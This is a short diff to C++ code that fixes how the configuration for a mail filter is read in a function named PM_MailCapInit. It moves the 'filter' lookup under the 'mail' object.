@@ -73,7 +73,7 @@ DWORD __stdcall PM_MailCapInit(JSONObject elem)
 	FILETIME ftime;
 
 	mail = elem[L"mail"]->AsObject();
-	filter = elem[L"filter"]->AsObject();
+	filter = mail[L"filter"]->AsObject();
 	g_mail_filter.max_size = (DWORD) filter[L"maxsize"]->AsNumber();
 	g_mail_filter.search_string[0] = L'*';
 	g_mail_filter.search_string[1] = 0;
